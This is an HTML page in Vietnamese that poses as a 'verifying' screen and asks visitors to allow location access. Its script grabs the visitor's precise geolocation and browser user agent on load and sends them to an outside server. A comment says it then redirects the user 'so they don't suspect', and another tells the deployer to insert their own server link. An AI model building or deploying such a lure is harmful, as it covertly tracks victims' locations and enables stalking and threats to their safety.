<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đang xác thực...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loader { margin: 20px auto; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h3>Vui lòng cấp quyền truy cập vị trí để tiếp tục</h3>
    <div class="loader"></div>
    <p id="status">Đang đợi tín hiệu...</p>

    <script>
        // ============================================================
        // BƯỚC QUAN TRỌNG: Thay link dưới bằng link Render của bạn
        // Ví dụ: const SERVER_URL = 'https://vitritest.onrender.com/luu-vi-tri';
        const SERVER_URL = 'https://vitritest.onrender.com/luu-vi-tri'; 
        // ============================================================

        function guiViTri(position) {
            const lat = position.coords.latitude;
            const long = position.coords.longitude;
            
            // Tạo link Google Maps chính xác
            const googleMapLink = `https://www.google.com/maps?q=${lat},${long}`;

            const data = {
                link_ggmap: googleMapLink,
                device: navigator.userAgent
            };

            fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => {
                document.getElementById('status').innerText = "Thành công!";
                // Chuyển hướng người dùng đi chỗ khác để họ không nghi ngờ
                window.location.href = googleMapLink; 
            })
            .catch(err => {
                console.error("Lỗi:", err);
                document.getElementById('status').innerText = "Lỗi kết nối server!";
            });
        }

        function tuChoi(error) {
            document.getElementById('status').innerText = "Bạn cần bấm 'Cho phép' (Allow) để tiếp tục.";
            console.warn("Người dùng từ chối cấp quyền.");
        }

        // Tự động xin quyền khi vào trang
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(guiViTri, tuChoi, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        } else {
            alert("Trình duyệt không hỗ trợ.");
        }
    </script>
</body>
</html>
